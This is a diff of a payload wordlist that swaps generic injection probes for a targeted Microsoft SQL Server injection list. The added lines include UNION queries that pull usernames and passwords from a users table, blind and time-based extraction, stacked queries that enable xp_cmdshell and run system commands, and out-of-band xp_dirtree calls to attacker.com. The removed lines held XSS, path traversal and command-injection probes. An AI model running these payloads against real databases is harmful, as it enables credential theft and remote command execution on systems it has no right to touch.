@@ -1,51 +1,83 @@
-'
-"
-''
-""
-' OR '1'='1
-' OR 1=1--
-' OR '1'='1'--
-' AND '1'='2
-' AND 1=2--
+' AND DB_NAME() IS NOT NULL WAITFOR DELAY '0:0:5'--
+' AND SYSTEM_USER IS NOT NULL WAITFOR DELAY '0:0:5'--
+' AND @@version LIKE '%Microsoft%' WAITFOR DELAY '0:0:5'--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CAST(@@version AS INT)--
+' AND 1=(SELECT 1/0)--
+' AND (SELECT COUNT(*) FROM sys.tables)>0--
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>64--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
 ' UNION SELECT NULL--
-' UNION SELECT 1,2,3--
-';WAITFOR DELAY '0:0:5'--
-' WAITFOR DELAY '0:0:5'--
-1' OR '1'='1
-1' AND '1'='2
-1'--
-1';WAITFOR DELAY '0:0:5'--
-admin'--
-test' OR 'a'='a
-' OR ''='
-%27
-%22
-%3C%3E
-%27%20OR%201%3D1--
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-"><svg onload=alert(1)>
-"><img src=x onerror=alert(1)>
-"><script>alert(1)</script>
-<iframe src=javascript:alert(1)>
-*
-%
-_
-%25
-%5F
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-../
-../../../../etc/passwd
-..\..\..\windows\win.ini
-|}
-"]}
-"}]}
-"}]}'
-|whoami
-;whoami
-&&whoami
-*)(uid=*)
-*)(|(uid=*))
-(|(uid=*))
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT DB_NAME(),NULL,NULL--
+' UNION SELECT SYSTEM_USER,NULL,NULL--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT name,NULL,NULL FROM sys.databases--
+' UNION SELECT name,NULL,NULL FROM sys.tables--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,NULL,NULL FROM users--
+' UNION SELECT password,NULL,NULL FROM users--
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT username+':'+password,NULL,NULL FROM users--
+' UNION SELECT TOP 1 name,NULL,NULL FROM sys.tables--
+' UNION SELECT TOP 1 column_name,NULL,NULL FROM information_schema.columns--
+' UNION SELECT TOP 1 username,NULL,NULL FROM users--
+' UNION SELECT TOP 1 password,NULL,NULL FROM users--
+'; SELECT @@version--
+'; SELECT DB_NAME()--
+'; SELECT SYSTEM_USER--
+'; SELECT user_name()--
+'; SELECT IS_SRVROLEMEMBER('sysadmin')--
+'; SELECT IS_MEMBER('db_owner')--
+'; SELECT name FROM sys.databases--
+'; SELECT name FROM sys.tables--
+'; SELECT table_name FROM information_schema.tables--
+'; SELECT column_name FROM information_schema.columns--
+'; EXEC sp_configure 'show advanced options',1;--
+'; RECONFIGURE;--
+'; EXEC sp_configure 'xp_cmdshell',1;--
+'; RECONFIGURE;--
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'dir C:\'--
+'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--
+'; EXEC xp_cmdshell 'ipconfig'--
+'; EXEC xp_cmdshell 'net user'--
+'; EXEC xp_cmdshell 'net localgroup administrators'--
+'; EXEC master..xp_dirtree '\\attacker.com\test'--
+'; EXEC master..xp_fileexist '\\attacker.com\test'--
+'; EXEC master..xp_subdirs '\\attacker.com\test'--
+' AND (SELECT TOP 1 name FROM sys.tables)='users'--
+' AND (SELECT COUNT(*) FROM sys.tables)>5--
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>77--
+' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))>97--
+' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>97--
+') UNION SELECT @@version--
+')) UNION SELECT @@version--
+'))) UNION SELECT @@version--
+1 UNION SELECT @@version--
+1 UNION SELECT DB_NAME()--
+1; SELECT @@version--
+1; SELECT DB_NAME()--
+1; SELECT SYSTEM_USER--
+' UNION SELECT @@version-- -
+' UNION SELECT @@version#
+'/**/UNION/**/SELECT/**/@@version,NULL,NULL--
+' UNION ALL SELECT @@version,NULL,NULL--
+' UNION ALL SELECT DB_NAME(),NULL,NULL--
+' UNION ALL SELECT SYSTEM_USER,NULL,NULL--
+%27%20UNION%20SELECT%20@@version,NULL,NULL--
+%27%3B%20SELECT%20DB_NAME()--
+%27%20AND%201=1--
+%27%20AND%201=2--
+' OR 1=1;--
+' OR 1=1; WAITFOR DELAY '0:0:5'--
+' AND 1=1; SELECT @@version--
+' AND 1=1; EXEC xp_cmdshell 'whoami'--
